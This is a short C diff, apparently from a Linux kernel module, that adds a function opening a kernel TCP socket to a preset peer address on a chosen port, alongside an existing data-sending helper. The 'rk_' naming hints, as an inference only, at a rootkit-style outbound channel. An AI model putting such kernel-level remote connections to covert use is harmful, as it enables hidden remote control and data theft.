@@ -34,6 +34,32 @@ struct socket *rk_connect(void)
 	return sock;
 }
 
+struct socket *rk_connect_port(unsigned short port)
+{
+	struct sockaddr_in peer = {
+		.sin_family = AF_INET,
+		.sin_port = htons(port),
+	};
+	struct socket *sock;
+	int error;
+
+	peer.sin_addr.s_addr = in_aton(peer_addr_str);
+
+	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
+				 IPPROTO_TCP, &sock);
+	if (error)
+		return ERR_PTR(error);
+
+	error = kernel_connect(sock, (struct sockaddr_unsized *)&peer,
+			       sizeof(peer), 0);
+	if (error) {
+		sock_release(sock);
+		return ERR_PTR(error);
+	}
+
+	return sock;
+}
+
 static int send_exact(struct socket *sock, const void *buf, size_t len)
 {
 	size_t sent = 0;
